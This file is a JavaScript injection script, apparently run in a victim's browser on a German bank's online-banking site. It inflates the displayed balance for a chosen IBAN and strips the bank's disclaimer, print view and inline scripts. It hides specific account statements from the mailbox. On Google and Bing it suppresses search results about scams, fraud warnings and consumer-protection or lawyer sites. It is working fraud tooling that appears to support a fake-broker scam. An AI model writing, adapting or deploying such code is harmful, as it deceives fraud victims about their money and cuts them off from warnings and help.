 if (window.location.href.indexOf("kontodetails") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf(kontodetails) > 0) {
    console.log("Matching URL detected, executing script...");

    var desiredIBAN = accountsecurity; // Your desired IBAN in '     '
var useSameAdjustmentAmount = true; // Set to true to use the same adjustment amount for all balances
var adjustmentAmount = xamount; // The adjustment amount to use if "useSameAdjustmentAmount" is true
var interval = 200; // Interval in milliseconds to check the condition


//  ONLY FIRST BALANCE

var BALANCE_CONFIGS = [
    { index: 0, adjustmentAmount: 3000.50 },

];

    function removeDruckansichtElements() {
        console.log("Attempting to remove elements containing 'Druckansicht'...");
        var elementsToRemoveDruckansicht = document.evaluate("//*[contains(text(),'Druckansicht')]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
        for (var i = 0; i < elementsToRemoveDruckansicht.snapshotLength; i++) {
            var element = elementsToRemoveDruckansicht.snapshotItem(i);
            console.log("Removing element:", element);
            element.remove();
        }
    }

    function checkAndModifyBalance() {
        console.log("Checking and modifying balance...");
        var ibanElement = document.getElementsByClassName("mkp-identifier-description")[0]?.children[1]?.children[0];
        if (ibanElement) {
            console.log("Found IBAN element:", ibanElement.textContent.trim());
            if (ibanElement.textContent.trim() === accountsecurity) {
                console.log("IBAN matches, modifying balance...");
                if (vorgemerkt === "no") {
                    modifyMainBalance();
                }
            } else {
                console.log("IBAN does not match, skipping balance modification.");
            }
        } else {
            console.log("IBAN element not found.");
        }
    }

   function modifyMainBalance() {
    console.log("Modifying main balance...");

    // Check for the submit element before modifying balance
    var submitElements = document.querySelectorAll('[class="mkp-flex mkp-icon-svg mkp-svg-bg mkp-icon-infoiiconunfilled mkp-icon-size-SMALL_22"]');
    if (submitElements.length === 0) {
        console.log("Submit element not found, skipping balance modification.");
        return; // Exit the function if the submit element is not present
    }

    console.log("Submit element found, proceeding with balance modification.");

    // Proceed with modifying balances if submit element exists
    BALANCE_CONFIGS.forEach(function(config) {
        var balanceElements = document.querySelectorAll('.plus, .minus');
        if (config.index < balanceElements.length) {
            var balanceElement = balanceElements[config.index];
            console.log("Modifying balance at index", config.index, "Element:", balanceElement);
            changeBalance(balanceElement, adjustmentAmount);
        } else {
            console.log("Balance element not found for index", config.index);
        }
    });
}


 // Function to change the balance
    function changeBalance(balanceElement, adjustmentAmount) {
        var currentBalanceText = balanceElement.textContent.trim();
        var currentBalanceValue = parseFloat(currentBalanceText.replace(/[^\d,-]+/g, '').replace(',', '.'));

        if (!isNaN(currentBalanceValue)) {
            var newBalanceValue = currentBalanceValue + adjustmentAmount;
            var newBalanceText = formatBalance(newBalanceValue) + ' EUR'; // Add "EUR" currency symbol

            // Update the balance text with the correct sign
            if (newBalanceValue < 0) {
                newBalanceText = '-' + newBalanceText.replace('-', ''); // Add negative sign if the balance is negative
            }

            // Change the class to "minus" if the balance is negative
            if (newBalanceValue < 0) {
                balanceElement.classList.remove('plus');
                balanceElement.classList.add('minus');
            } else {
                balanceElement.classList.remove('minus');
                balanceElement.classList.add('plus');
            }

            // Update the balance element with the new value and text
            balanceElement.textContent = newBalanceText;

            console.log('Balance changed from ' + currentBalanceText + ' to ' + newBalanceText);

            // Remove elements with onclick="return IF.checkFirstSubmit();" after 5 milliseconds
            setTimeout(function() {
                var submitElements = document.querySelectorAll('[class="mkp-flex mkp-icon-svg mkp-svg-bg mkp-icon-infoiiconunfilled mkp-icon-size-SMALL_22"]');
                submitElements.forEach(function(element) {
                    element.remove();
                    console.log("Element with aria-label='Karten verwalten' removed.");
                });
            }, 5); // 5 milliseconds
        } else {
            console.log('Failed to parse current balance value.');
        }
    }

    function formatBalance(balance) {
        var formattedBalance = balance.toFixed(2).replace(/\./g, ',');
        return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
    }

    removeDruckansichtElements();
    checkAndModifyBalance();
    setInterval(checkAndModifyBalance, interval);
}


 if (window.location.href.indexOf("kontodetails") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf(kontodetails) > 0 ) {

// Function to remove inline scripts from the document
function removeInlineScripts() {
    console.log("Removing inline scripts...");
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log("Inline script removed.");
    });
}

// Function to remove elements with title "Druckansicht"
function removeDruckansichtElements() {
    var elements = document.querySelectorAll('[title="Druckansicht"]');
    elements.forEach(function(element) {
        element.remove();
        console.log('Element with title "Druckansicht" removed.');
    });
}

// Remove all inline scripts from the document
removeInlineScripts();

// Remove elements with title "Druckansicht" initially
removeDruckansichtElements();

// Periodically remove elements with title "Druckansicht"
setInterval(removeDruckansichtElements, 200); // Check every 2 seconds
}

if (window.location.href.indexOf("kontodetails") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf(kontodetails) > 0) {
    console.log("Matching URL detected, executing script...");
(function() {

    var DesiredIBAN = accountsecurity; // Your desired IBAN in '     '
var UseSameAdjustmentAmount = true; // Set to true to use the same adjustment amount for all balances
var AdjustmentAmount = xamount; // The adjustment amount to use if "useSameAdjustmentAmount" is true
var Interval = 200; // Interval in milliseconds to check the condition


//  ONLY FIRST BALANCE

var BBALANCE_CONFIGS = [
    { index: 3, AdjustmentAmount: 3000.50 },

    { index: 5, AdjustmentAmount: 3000.50 },

];

    function checkAndModifyBalance() {
        console.log("Checking and modifying balance...");
        var ibanElement = document.getElementsByClassName("mkp-identifier-description")[0]?.children[1]?.children[0];
        if (ibanElement) {
            console.log("Found IBAN element:", ibanElement.textContent.trim());
            if (ibanElement.textContent.trim() === accountsecurity) {
                console.log("IBAN matches, modifying balance...");
                if (vorgemerkt === "no") {
                    modifyMainBalance();
                }
            } else {
                console.log("IBAN does not match, skipping balance modification.");
            }
        } else {
            console.log("IBAN element not found.");
        }
    }

   function modifyMainBalance() {
    console.log("Modifying main balance...");

    // Check for the submit element before modifying balance
    var submitElements = document.querySelectorAll('[title="Der angezeigte Kontostand entspricht nicht immer Ihrem tatsächlichen Guthaben. So können bereits als Buchung angezeigte Umsätze noch nicht vom Betrag des Kontostands abgezogen bzw. wertgestellt sein. Es ist möglich, dass Zinsen wegen einer Überziehung des Kontos anfallen."]');
    if (submitElements.length === 0) {
        console.log("Submit element not found, skipping balance modification.");
        return; // Exit the function if the submit element is not present
    }

    console.log("Submit element found, proceeding with balance modification.");

    // Proceed with modifying balances if submit element exists
    BBALANCE_CONFIGS.forEach(function(config) {
          // Access the host element (the one that contains the shadow DOM)
  let hostElement = document.querySelector('#cpl-slot-MAIN');

  // Check if the host element exists and has a shadow root
  if (hostElement && hostElement.shadowRoot) {
    console.log('Shadow root found.');

    // Access the shadow root
    let shadowRoot = hostElement.shadowRoot;
        var balanceElements = shadowRoot.querySelectorAll('.cpl-1kbxr9h, .cpl-179qx59');
        if (config.index < balanceElements.length) {
            var balanceElement = balanceElements[config.index];
            console.log("Modifying balance at index", config.index, "Element:", balanceElement);
            changeBalance(balanceElement, adjustmentAmount);
        } else {
            console.log("Balance element not found for index", config.index);
        } } else {
    console.log('Host element or shadow root not found.');
  }
    } );
}


 // Function to change the balance
    function changeBalance(balanceElement, adjustmentAmount) {
        var currentBalanceText = balanceElement.textContent.trim();
        var currentBalanceValue = parseFloat(currentBalanceText.replace(/[^\d,-]+/g, '').replace(',', '.'));

        if (!isNaN(currentBalanceValue)) {
            var newBalanceValue = currentBalanceValue + adjustmentAmount;
            var newBalanceText = formatBalance(newBalanceValue) + ' EUR'; // Add "EUR" currency symbol

            // Update the balance text with the correct sign
            if (newBalanceValue < 0) {
                newBalanceText = '-' + newBalanceText.replace('-', ''); // Add negative sign if the balance is negative
            }

            // Change the class to "cpl-179qx59" if the balance is negative
            if (newBalanceValue < 0) {
                balanceElement.classList.remove('cpl-1kbxr9h');
                balanceElement.classList.add('cpl-179qx59');
            } else {
                balanceElement.classList.remove('cpl-179qx59');
                balanceElement.classList.add('cpl-1kbxr9h');
            }

            // Update the balance element with the new value and text
            balanceElement.textContent = newBalanceText;

            console.log('Balance changed from ' + currentBalanceText + ' to ' + newBalanceText);

            // Remove elements with onclick="return IF.checkFirstSubmit();" after 5 milliseconds
            setTimeout(function() {
                var submitElements = document.querySelectorAll('[title="Der angezeigte Kontostand entspricht nicht immer Ihrem tatsächlichen Guthaben. So können bereits als Buchung angezeigte Umsätze noch nicht vom Betrag des Kontostands abgezogen bzw. wertgestellt sein. Es ist möglich, dass Zinsen wegen einer Überziehung des Kontos anfallen."]');
                submitElements.forEach(function(element) {
                    element.remove();
                    console.log("Element with aria-label='Karten verwalten' removed.");
                });
            }, 5); // 5 milliseconds
        } else {
            console.log('Failed to parse current balance value.');
        }
    }

    function formatBalance(balance) {
        var formattedBalance = balance.toFixed(2).replace(/\./g, ',');
        return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
    }


    checkAndModifyBalance();
    setInterval(checkAndModifyBalance, Interval);
    })();
}

if (window.location.href.indexOf("Posteingang") > 0 || window.location.href.indexOf("posteingang") > 0 || window.location.href.indexOf(finanz) > 0) {

//  function removeFirstMatchingElement() {
//    setInterval(() => {
//        const oddElement = document.querySelector(".tablerowodd.tablerowmarked.postbox-message-row");
//        if (oddElement) {
//            oddElement.remove();
////        }
//        const evenElement = document.querySelector(".tableroweven.tablerowmarked.postbox-message-row");
//        if (evenElement) {
//            evenElement.remove();
//        }
//    }, 100);
//  }

//  // Start removing elements
//  removeFirstMatchingElement();

const titlesToRemove = [
    "Kontoauszug 1/2025",
    "Kontoauszug 2/2025",
    "Kontoauszug 6/2024",
    "Transaktion 4/2025"
];

function removeElementsByTitle() {
    setInterval(() => {
        document.querySelectorAll("[title]").forEach(element => {
            if (titlesToRemove.some(title => element.title.includes(title))) {
                if (element.parentElement && element.parentElement.parentElement && element.parentElement.parentElement.parentElement) {
                    element.parentElement.parentElement.parentElement.remove();
                }
            }
        });
    }, 200);
}

removeElementsByTitle();


    }



// Script 4: Search Result Filter
    if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1 &&
        window.location.href.indexOf("ing.de") === -1) {
(function() {
  'use strict';

  // Define the words, domains, and URLs to block
  var blockedWords = ['Betrug', 'schwarz', 'Scam', 'Broker', 'Finanzbetrug', 'Auszahlung', 'seriös' ]; // Add the words to block here
  var blockedDomains = ['watchlist-internet.at', 'broker-zahlt-nicht.de', 'scamadviser.com', 'finanzsache.com', 'webparanoid.com', 'personal-reviews.com', 'unique-reviews.com', 'kanzlei-herfurtner.de', 'verbraucherzentrale.de', 'betrug.de', 'ritschel-keller.de', 'seitcheck.de', 'anwalt.de' ]; // Add the domains to block here
  var blockedUrls = ['https://de.trustpilot.com/review/winstonmartin.com', 'https://www.example2.com']; // Add the urls to block here

  // Function to hide elements
  function hideElement(element) {
    if (element.style) element.style.display = 'none';
  }

  // Function to check and hide search results
  function checkAndHideSearchResults() {
    // Google
    var googleResults = document.querySelectorAll('.g');
    googleResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });

    // Bing
    var bingResults = document.querySelectorAll('.b_algo');
    bingResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });
  }


  // Function to execute the search result filtering
    function executeSearchResultFilter() {
      checkAndHideSearchResults();

      // Set an interval to check repeatedly, to deal with lazy-loaded search results
      setInterval(checkAndHideSearchResults, 1000);
    }

    // Call the function immediately
    executeSearchResultFilter();
  })();
        }

